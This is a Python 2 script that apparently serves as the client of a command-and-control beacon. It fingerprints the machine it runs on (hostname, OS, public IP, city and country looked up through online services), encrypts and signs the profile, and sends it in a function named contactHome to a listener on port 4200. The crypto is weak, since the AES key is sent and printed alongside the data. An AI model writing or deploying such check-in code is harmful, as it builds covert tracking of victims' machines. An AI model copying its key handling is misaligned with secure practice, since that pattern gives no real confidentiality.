import platform
import socket
import requesocks
import base64
import random
import json
from Crypto import Random
from Crypto.Cipher import AES
from ecdsa import SigningKey, VerifyingKey, BadSignatureError, NIST521p

msg = ""

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]

class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))


def generateKeys():
    global sk, vk, vKey, cipher, sig, keyPass, decrypted, message, msg

    sk = SigningKey.generate(curve=NIST521p)
    vk = sk.get_verifying_key()

    secretKey = str(random.randrange(1111111111111111,6666666666666666))
    keyPass = base64.b64encode(secretKey)


    cipher = AESCipher(secretKey)

    encrypted = cipher.encrypt(msg)

    vKey = cipher.encrypt(str(vk.to_pem()))

    decrypted = cipher.decrypt(encrypted)

    message = encrypted
    sig = sk.sign(message)

def myInfo():
    global host, idMsg, msg

    # Get public facing IP
    session = requesocks.session()
    ipJson = session.get("http://httpbin.org/ip").text
    jsonStr = json.loads(ipJson)
    ip = jsonStr['origin']

    ipJson2 = session.get("http://freegeoip.net/json/" + ip).text
    jsonStr2 = json.loads(ipJson2)
    city = jsonStr2['city']
    country = jsonStr2['country_name']

    data = {}
    data['hostname'] = socket.gethostname()
    data['os'] = platform.platform()
    data['external_ip'] = ip
    data['city'] = city
    data['country'] = country
    json_data = json.dumps(data)

    msg = json_data

def contactHome():

    global msg, sep, vKey, sig, message

    sep = str(random.randrange(111, 999, 3))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4200))
    print 'connected'

    msg = (sep + keyPass + sep + vKey + sep + cipher.encrypt(sig) + sep + message)
    print msg

    s.sendall(msg)
    s.close()

    print cipher.decrypt(vKey)

myInfo()
generateKeys()
contactHome()